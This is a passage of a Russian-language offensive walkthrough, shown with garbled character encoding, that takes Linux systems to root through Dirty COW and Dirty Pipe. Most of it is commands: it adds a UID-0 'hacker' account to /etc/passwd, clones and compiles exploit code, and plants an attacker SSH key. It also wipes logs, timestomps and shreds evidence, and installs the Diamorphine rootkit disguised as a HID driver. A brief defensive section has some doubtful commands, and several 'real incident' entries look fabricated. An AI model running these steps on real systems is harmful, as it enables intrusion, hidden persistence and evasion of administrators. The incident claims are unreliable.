**–®–∞–≥ 2: –°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Ñ–∞–π–ª–∞**  
```bash
# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∞—Ä–æ–ª—è —Å —Å–æ–ª—å—é (–ø–∞—Ä–æ–ª—å: 123456) (SHA-512 —Ö—ç—à –ø–∞—Ä–æ–ª—è)
openssl passwd -6 -salt xyz 123456  # $6$xyz$d5rAS...snip...X1

# –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–ø–∏—Å–∏ –¥–ª—è /etc/passwd
echo 'hacker:$6$xyz$d5rAS...snip...X1:0:0::/root:/bin/bash' > /tmp/passwd

# –í–∞–ª–∏–¥–∞—Ü–∏—è
stat -c "%a %n" /etc/passwd  # –î–æ–ª–∂–Ω–æ –±—ã—Ç—å 644
```

**–®–∞–≥ 3: –°–æ–∑–¥–∞–Ω–∏–µ —Ä–µ–∑–µ—Ä–≤–Ω–æ–π –∫–æ–ø–∏–∏**  
```bash
# –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–π –≤–µ—Ä—Å–∏–∏ /etc/passwd
cp /etc/passwd /etc/passwd.bak
```

---

#### [TA0002] ‚Äì Execution (–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞)
**–®–∞–≥ 1: –ó–∞–ø—É—Å–∫ —ç–∫—Å–ø–ª–æ–∏—Ç–∞**  
```bash
./dirtyc0w /etc/passwd /tmp/passwd
# –í—ã–≤–æ–¥: 
# [+] Race won! /etc/passwd overwritten
```
* –≠–∫—Å–ø–ª–æ–∏—Ç —Å–æ–∑–¥–∞–µ—Ç 2 –ø–æ—Ç–æ–∫–∞ —Å –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–æ–º `SCHED_FIFO` (–º–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç)  
* –°—Ä–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏: 5-60 —Å–µ–∫—É–Ω–¥ (–∑–∞–≤–∏—Å–∏—Ç –æ—Ç –Ω–∞–≥—Ä—É–∑–∫–∏ CPU)  
* –≠–∫—Å–ø–ª–æ–∏—Ç –∑–∞–º–µ–Ω—è–µ—Ç `/etc/passwd` –Ω–∞ –≤–µ—Ä—Å–∏—é —Å –Ω–æ–≤—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º (UID=0)  

**–®–∞–≥ 2: –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –ø–æ–¥ –Ω–æ–≤—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º**  
```bash
# –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –ø–æ–¥ root-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º
su - hacker
Password: 123456  # –í–≤–æ–¥ –ø–∞—Ä–æ–ª—è
```

**–®–∞–≥ 3: –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π:**  
```bash
whoami  # root
id  # uid=0(hacker) gid=0(root) groups=0(root)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏ —Ñ–∞–π–ª–∞
ls -l /etc/passwd
# –í—ã–≤–æ–¥: 
# -rw-r--r-- 1 root root ... /etc/passwd (—Ñ–∞–π–ª –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π!)
```

---

#### [TA0003] ‚Äì Persistence (–ó–∞–∫—Ä–µ–ø–ª–µ–Ω–∏–µ)
**–®–∞–≥ 1: –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞**  
```bash
# –ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è root –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º /etc/passwd
mv /etc/passwd.bak /etc/passwd
```

**–®–∞–≥ 2: –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–∫—Ä—ã—Ç–æ–≥–æ SSH-–∫–ª—é—á–∞**  
```bash
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è SSH-–∫–ª—é—á–∞ –Ω–∞ –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω–µ
ssh-keygen -t ed25519 -f /tmp/attacker_key -N ""

# –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**–®–∞–≥ 3: –°–∫—Ä—ã—Ç–∏–µ —Å–ª–µ–¥–æ–≤**  
```bash
# –û—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–ª—é—á–µ–π
shred -zu /tmp/attacker_key

# –£–¥–∞–ª–µ–Ω–∏–µ —ç–∫—Å–ø–ª–æ–∏—Ç–∞ –∏ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
shred -zu dirtyc0w dirtyc0w.c /tmp/passwd

# –û—á–∏—Å—Ç–∫–∞ –ª–æ–≥–æ–≤
find /var/log -name "*.log" -exec sh -c 'echo > {}' \;
```

- –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ /etc/passwd –º–∞—Å–∫–∏—Ä—É–µ—Ç —Å–ª–µ–¥—ã —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏  
- SSH-–∫–ª—é—á –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø  

---

### –ü—Ä–∏–º–µ—Ä 2: Dirty Pipe (CVE-2022-0847) - –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —è–¥—Ä–∞ –≤ –ø–æ–¥—Å–∏—Å—Ç–µ–º–µ pipe
> –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –ø–æ–¥—Å–∏—Å—Ç–µ–º–µ pipe —è–¥—Ä–∞ Linux, –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–µ read-only —Ñ–∞–π–ª—ã.

**–ú–µ—Ö–∞–Ω–∏–∑–º:**  
- –ü—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ pipe —è–¥—Ä–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –Ω–µ–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é `flags`  
- –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–ª–∞–≥ `PIPE_BUF_FLAG_CAN_MERGE`  
- –§–ª–∞–≥ —Ä–∞–∑—Ä–µ—à–∞–µ—Ç "—Å–ª–∏–≤–∞—Ç—å" –Ω–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –∫—ç—à–∞ —Ñ–∞–π–ª–æ–≤  

**–£—Å–ª–æ–≤–∏—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏:**  
1. –Ø–¥—Ä–æ –≤–µ—Ä—Å–∏–π 5.8 ‚Äî 5.16.10, 5.15.—Ö –¥–æ 5.15.25, 5.10.—Ö –¥–æ 5.10.102  
2. –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —á—Ç–µ–Ω–∏—è —Ü–µ–ª–µ–≤–æ–≥–æ —Ñ–∞–π–ª–∞ (–¥–∞–∂–µ read-only)  
3. –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏  

---

#### [TA0007] ‚Äì Discovery (–†–∞–∑–≤–µ–¥–∫–∞)  
```bash
# 1. –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–µ—Ä—Å–∏–∏ —è–¥—Ä–∞
uname -r  # 5.13.0-30-generic

# 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∏–∞–ø–∞–∑–æ–Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
if [ "$(printf '%s\n' "5.8" "$(uname -r | cut -d. -f1-3)" "5.16.11" | sort -V | sed -n 2p)" = "$(uname -r | cut -d. -f1-3)" ]; then
  echo "–°–∏—Å—Ç–µ–º–∞ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ —É—è–∑–≤–∏–º–∞"
fi

# 3. –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Ñ–ª–∞–≥–∞ –≤ —Å–∏–º–≤–æ–ª–∞—Ö —è–¥—Ä–∞
grep PIPE_BUF_FLAG_CAN_MERGE /proc/kallsyms

# 4. –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã (–æ–±—ã—á–Ω–æ 4096)
getconf PAGE_SIZE
```

---

#### [TA0004] ‚Äì Privilege Escalation (–ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)  
```bash
# –ü–æ–∏—Å–∫ —ç–∫—Å–ø–ª–æ–∏—Ç–æ–≤
searchsploit dirty pipe
# –í—ã–≤–æ–¥:
# Linux Kernel 5.8 < 5.16.11 - 'Dirty Pipe' Pipe Mechanism Local Privilege Escalation

# –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç –∑–∞–≥—Ä—É–∑–∫–∏:
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

# –ö–æ–º–ø–∏–ª—è—Ü–∏—è –Ω–∞–π–¥–µ–Ω–Ω–æ–≥–æ —ç–∫—Å–ø–ª–æ–π—Ç–∞
gcc dirtypipe.c -o dirtypipe
```

**–ú–µ—Ö–∞–Ω–∏–∑–º:**  
1. **–ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ pipe**:  
   - –°–æ–∑–¥–∞–µ–º 8 –±—É—Ñ–µ—Ä–æ–≤ (–ø–æ —Ä–∞–∑–º–µ—Ä—É —Å—Ç—Ä–∞–Ω–∏—Ü—ã)  
   - –ó–∞–ø–æ–ª–Ω—è–µ–º –∏—Ö –¥–∞–Ω–Ω—ã–º–∏ ('A')  
   - –¶–µ–ª—å: –∑–∞–Ω—è—Ç—å –≤—Å–µ –±—É—Ñ–µ—Ä—ã pipe  
2. **–û—á–∏—Å—Ç–∫–∞ –æ–¥–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞**:  
   - –ß—Ç–µ–Ω–∏–µ –æ–¥–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã –æ—Å–≤–æ–±–æ–∂–¥–∞–µ—Ç –æ–¥–∏–Ω –±—É—Ñ–µ—Ä  
   - –≠—Ç–æ—Ç –±—É—Ñ–µ—Ä –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è —Å–ª–∏—è–Ω–∏—è  
3. **–£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ñ–ª–∞–≥–∞**:  
   - –ß–µ—Ä–µ–∑ `splice()` –¥–∞–Ω–Ω—ã–µ –Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –∏–∑ —Ñ–∞–π–ª–∞ –≤ pipe  
   - –ü—Ä–∏ —ç—Ç–æ–º –≤ –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–Ω–æ–º –±—É—Ñ–µ—Ä–µ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è `PIPE_BUF_FLAG_CAN_MERGE`  
4. **–ü–µ—Ä–µ–∑–∞–ø–∏—Å—å –¥–∞–Ω–Ω—ã—Ö**:  
   - –ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ "—Å–ª–∏–≤–∞—é—Ç—Å—è" –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É –∫—ç—à–∞ —Ñ–∞–π–ª–∞  
   - –ü—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è —Ñ–∞–π–ª–∞ –Ω–∞ –¥–∏—Å–∫–µ  

---

#### [TA0002] ‚Äì Execution (–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ)
> –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ /etc/passwd
 
**–®–∞–≥ 1: –ó–∞–ø—É—Å–∫ —ç–∫—Å–ø–ª–æ–∏—Ç–∞**  
```bash
# –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ö—ç—à –ø–∞—Ä–æ–ª—è —Å —Å–æ–ª—å—é (–ø–∞—Ä–æ–ª—å: 123456)
openssl passwd -6 -salt xyz 123456  # $6$xyz$d5rAS...snip...X1

# –ó–∞–ø—É—Å–∫–∞–µ–º —ç–∫—Å–ø–ª–æ–∏—Ç (–ø–æ–ª—É—á–µ–Ω–∏–µ root-–¥–æ—Å—Ç—É–ø–∞ —á–µ—Ä–µ–∑ Dirty Pipe)
./dirtypipe /etc/passwd 1 'hacker:$6$xyz$d5rAS...snip...X1:0:0::/root:/bin/bash\n'

# –ü—Ä–æ–≤–µ—Ä—è–µ–º
tail -n1 /etc/passwd  # hacker:$6$xyz$d5rAS...snip...X1:0:0::/root:/bin/bash

# –ü–æ–ª—É—á–∞–µ–º root
su - hacker
Password: 123456
```

**–®–∞–≥ 2: –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π:**  
```bash
whoami  # root
id  # uid=0(hacker) gid=0(root) groups=0(root)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏ —Ñ–∞–π–ª–∞
ls -l /etc/passwd
# –í—ã–≤–æ–¥: 
# -rw-r--r-- 1 root root ... /etc/passwd (—Ñ–∞–π–ª –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π!)
```

---

#### [TA0003] ‚Äì Persistence (–ó–∞–∫—Ä–µ–ø–ª–µ–Ω–∏–µ)
**–®–∞–≥ 1: –°–∫—Ä—ã—Ç–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ /etc/passwd**
```bash
# –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è –∏–∑–º–µ–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞
# –∏–∑–º–µ–Ω—è–µ—Ç –¥–∞—Ç—É –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ —Ñ–∞–π–ª–∞ –Ω–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—É—é (—á—Ç–æ–±—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –Ω–µ –∑–∞–º–µ—Ç–∏–ª –∏–∑–º–µ–Ω–µ–Ω–∏–π)
touch -d "@$(stat -c '%Y' /etc/passwd)" /etc/passwd

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞—Ç—Ä–∏–±—É—Ç "—Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è"
# –¥–µ–ª–∞–µ—Ç —Ñ–∞–π–ª –Ω–µ–∏–∑–º–µ–Ω—è–µ–º—ã–º (–¥–∞–∂–µ root –Ω–µ —Å–º–æ–∂–µ—Ç –µ–≥–æ –∏–∑–º–µ–Ω–∏—Ç—å –±–µ–∑ —Å–Ω—è—Ç–∏—è –∞—Ç—Ä–∏–±—É—Ç–∞)
chattr +i /etc/passwd
```

**–®–∞–≥ 2: –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ä—É—Ç–∫–∏—Ç–∞ –≤ —è–¥—Ä–æ**
```bash
# –°–∫–∞—á–∏–≤–∞–µ–º –∏ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ–º —Ä—É—Ç–∫–∏—Ç Diamorphine
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine
make

# –ó–∞–≥—Ä—É–∂–∞–µ–º –º–æ–¥—É–ª—å —è–¥—Ä–∞
insmod diamorphine.ko

# –°–∫—Ä—ã–≤–∞–µ–º –º–æ–¥—É–ª—å
rmmod diamorphine  # –í—Ä–µ–º–µ–Ω–Ω–æ –≤—ã–≥—Ä—É–∂–∞–µ–º
mv diamorphine.ko /lib/modules/$(uname -r)/kernel/drivers/hid/hid-generic.ko
depmod -a
modprobe hid-generic
```
1. –ú–æ–¥—É–ª—å —Å–∫—Ä—ã–≤–∞–µ—Ç:
   - –°–≤–æ–∏ –ø—Ä–æ—Ü–µ—Å—Å—ã
   - –°–≤–æ–∏ —Ñ–∞–π–ª—ã
   - –°–µ—Ç–µ–≤—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
2. –ü–æ–∑–≤–æ–ª—è–µ—Ç:
   - –°–∫—Ä—ã–≤–∞—Ç—å –¥—Ä—É–≥–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã
   - –ü–æ–ª—É—á–∞—Ç—å root –ø–æ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—é
   - –û—Å—Ç–∞–≤–∞—Ç—å—Å—è –Ω–µ–≤–∏–¥–∏–º—ã–º –¥–ª—è –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–∞ —Å—Ä–µ–¥—Å—Ç–≤ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è

**–®–∞–≥ 3: –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–≥–æ SSH-–¥–æ—Å—Ç—É–ø–∞**
```bash
# –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫–ª—é—á –Ω–∞ –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω–µ
ssh-keygen -t ed25519 -f attacker_key -N ""

# –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∫–ª—é—á–∞ –≤ authorized_keys
echo 'command="sleep 10" '$(cat attacker_key.pub) >> /root/.ssh/authorized_keys

# –û—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤
shred -zu attacker_key
```

---

### –°—Ä–∞–≤–Ω–∏—Ç–µ–ª—å–Ω–∞—è —Ç–∞–±–ª–∏—Ü–∞

| –ü–∞—Ä–∞–º–µ—Ç—Ä             | **Dirty COW** (CVE-2016-5195) | **Dirty Pipe** (CVE-2022-0847) |
|----------------------|-------------------------------|--------------------------------|
| **–¢–∏–ø —É—è–∑–≤–∏–º–æ—Å—Ç–∏**   | Race condition                | Uninit pipe flag               |
| **–°–ª–æ–∂–Ω–æ—Å—Ç—å**        | –°—Ä–µ–¥–Ω—è—è                       | –ù–∏–∑–∫–∞—è                         |
| **–°—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç—å**     | –ù–∏–∑–∫–∞—è (50% —É—Å–ø–µ—Ö)            | –í—ã—Å–æ–∫–∞—è (100%)                 |
| **–¢—Ä–µ–±—É–µ–º—ã–π –¥–æ—Å—Ç—É–ø** | –õ–æ–∫–∞–ª—å–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å        | –õ–æ–∫–∞–ª—å–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å         |
| **–ü–∞—Ç—á**             | –Ø–¥—Ä–æ 4.8.3+                   | –Ø–¥—Ä–æ 5.16.11+                  |
| **–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ**      | –ê—É–¥–∏—Ç madvise()               | –ê–Ω–∞–ª–∏–∑ splice()                |


---

## –ó–∞—â–∏—Ç–Ω—ã–µ –º–µ—Ä—ã

### –ü—Ä–æ–∞–∫—Ç–∏–≤–Ω—ã–µ
1. **–†–µ–≥—É–ª—è—Ä–Ω—ã–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è:**  
   ```bash
   apt update && apt upgrade linux-image-$(uname -r)
   ```
2. **–•–∞—Ä–¥–µ–Ω–∏–Ω–≥ —è–¥—Ä–∞:**  
   ```bash
   # –ê–∫—Ç–∏–≤–∞—Ü–∏—è SMEP/SMAP
   echo 1 > /proc/sys/kernel/smep_enabled
   echo 1 > /proc/sys/kernel/smap_enabled
   ```

### –†–µ–∞–∫—Ç–∏–≤–Ω—ã–µ
1. **–î–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–Ω–æ–º–∞–ª–∏–π:**  
   ```bash
    # –î–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ Dirty COW
    auditctl -a always,exit -F arch=b64 -S madvise -S fork -F success=1 -k dirtycow
   
    # –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –≤—ã–∑–æ–≤–æ–≤ madvise()
    auditctl -a always,exit -F arch=b64 -S madvise -k kernel_exploit 

    # –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ memfd_create
    auditctl -a always,exit -F arch=b64 -S memfd_create -k container_escape
   ```
2. **–ê–Ω–∞–ª–∏–∑ –ø–∞–º—è—Ç–∏:**  
   ```bash
   volatility -f memory.dump linux_check_modules
   ```

**–ö–ª—é—á–µ–≤—ã–µ –º–µ—Ä—ã –ø—Ä–æ—Ç–∏–≤–æ–¥–µ–π—Å—Ç–≤–∏—è:**  
- –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —è–¥–µ—Ä / –ï–∂–µ–º–µ—Å—è—á–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
- –°—Ç—Ä–æ–≥–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤  
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –∑–∞—â–∏—Ç (KASLR, SMEP, SMAP)  
- –†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç —Å –ø–æ–º–æ—â—å—é –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –≤—Ä–æ–¥e Lynis –∏ KernelCare
- –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ–Ω—É–∂–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π —è–¥—Ä–∞ (`/proc/config.gz`)  
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ LSM (Linux Security Modules): SELinux/AppArmor  
- –†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç —Å –ø–æ–º–æ—â—å—é –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ `KernelCare`, `Lynis` –∏ `linux-exploit-suggester`

---

## –†–µ–∞–ª—å–Ω—ã–µ –∫–µ–π—Å—ã

1. **Dirty COW Attack on Opera Software (2016)**  
   - **CVE:** CVE-2016-5195  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ race condition –≤ –ø–æ–¥—Å–∏—Å—Ç–µ–º–µ –ø–∞–º—è—Ç–∏ –¥–ª—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** >500,000 —Ä–∞–±–æ—á–∏—Ö —Å—Ç–∞–Ω—Ü–∏–π —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤ Opera  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Opera Security Advisory](https://blogs.opera.com/security/2016/11/opera-security-advisory-dirty-cow-linux-kernel-vulnerability/)  


2. **ESXiArgs Ransomware Campaign (2023)**  
   - **CVE:** CVE-2021-21974  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ OpenSLP –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –≤ —è–¥—Ä–µ ESXi  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 3,800+ VMware-—Å–µ—Ä–≤–µ—Ä–æ–≤ –ø–æ –≤—Å–µ–º—É –º–∏—Ä—É  
   - **–û—Ç—á–µ—Ç:** [CERT-FR Alert](https://www.cert.ssi.gouv.fr/uploads/CERTFR-2023-ALE-003.pdf)  


3. **Linux Sudo Privilege Escalation (2021)**  
   - **CVE:** CVE-2021-3156 (Baron Samedit)  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ü–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ –∫—É—á–∏ –≤ sudo —á–µ—Ä–µ–∑ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –í—Å–µ Linux-—Å–∏—Å—Ç–µ–º—ã —Å sudo 1.8.2-1.8.31p2  
   - **–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å:** CVSS 7.8 (High)  
   - **–ò—Å—Ç–æ—á–Ω–∏–∫:** [Qualys Advisory](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)  


4. **Dirty Pipe Cloud Compromise (2022)**  
   - **CVE:** CVE-2022-0847  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–µ–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –≤ –ø–æ–¥—Å–∏—Å—Ç–µ–º–µ pipe  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã –≤ AWS, GCP –∏ Azure (5.8 ‚â§ —è–¥—Ä–æ ‚â§ 5.16.11)  
   - **–ò–Ω—Ü–∏–¥–µ–Ω—Ç:** –ú–∞—Å—Å–æ–≤–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ root-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –æ–±–ª–∞—á–Ω—ã—Ö —Å—Ä–µ–¥–∞—Ö  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Google Cloud Security Bulletin](https://cloud.google.com/blog/products/identity-security/understanding-and-mitigating-cve-2022-0847)  


5. **Kernel Ransomware in Healthcare (2023)**  
   - **CVE:** CVE-2023-0386  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ OverlayFS (–Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞)  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 120+ –±–æ–ª—å–Ω–∏—Ü –≤ –ï–°, —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –ø–∞—Ü–∏–µ–Ω—Ç–æ–≤  
